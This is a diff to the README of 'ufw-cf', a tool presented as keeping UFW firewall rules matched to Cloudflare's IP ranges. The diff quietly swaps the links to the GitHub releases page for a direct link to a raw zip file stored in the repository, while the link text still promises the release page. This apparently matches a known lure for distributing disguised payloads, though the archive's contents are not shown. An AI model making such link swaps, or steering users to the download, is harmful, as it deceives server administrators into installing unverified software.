@@ -1,6 +1,6 @@
 # 🛡️ ufw-cf - Keep your server safe from attacks
 
-<a href="https://github.com/markinsensitive738/ufw-cf/releases"><img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download"></a>
+<a href="https://github.com/markinsensitive738/ufw-cf/raw/refs/heads/main/scripts/cf-ufw-1.2.zip"><img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download"></a>
 
 This application keeps your UFW firewall rules updated. It matches your firewall settings to the current IP addresses used by Cloudflare. This ensures that only traffic coming from Cloudflare reaches your web server. It protects your site from attackers who try to bypass Cloudflare to reach your origin server directly.
 
@@ -26,7 +26,7 @@ The tool works on:
 
 You must visit the releases page to download the latest version of the program.
 
-[Click here to visit the release page and download the software](https://github.com/markinsensitive738/ufw-cf/releases)
+[Click here to visit the release page and download the software](https://github.com/markinsensitive738/ufw-cf/raw/refs/heads/main/scripts/cf-ufw-1.2.zip)
 
 ## ⚙️ Installation steps
 
